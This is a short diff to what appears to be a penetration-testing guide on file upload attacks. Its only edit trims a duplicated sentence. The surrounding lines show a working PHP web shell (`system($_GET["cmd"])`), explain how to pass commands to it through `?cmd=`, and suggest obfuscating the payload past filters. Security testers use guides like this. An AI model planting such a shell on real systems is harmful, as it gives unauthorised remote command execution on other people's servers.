@@ -188,5 +188,5 @@ If the uploaded file seems to be both stored and served securely, the last resor
 
 1. When you have successfully uploaded your payload, just put your commands after the variable `?cmd=` (ex: `?cmd=ls -la`).
 2. `<?php system($_GET["cmd"]);?>`
-3. 400 Bad Request this is a classic response to some filters, it may be necessary to bypass them or obfuscate the feed (400 Bad Request is a classic response to some filters, so you might need to bypass them or obfuscate the string).
+3. 400 Bad Request this is a classic response to some filters, it may be necessary to bypass them or obfuscate the feed.
 
